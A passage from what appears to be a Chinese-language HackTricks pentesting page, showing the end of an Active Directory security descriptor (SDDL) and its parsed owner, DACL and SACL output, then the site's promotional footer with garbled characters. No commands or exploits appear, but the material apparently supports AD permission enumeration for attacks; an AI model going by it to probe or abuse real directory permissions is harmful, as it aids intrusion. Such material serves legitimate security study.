6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
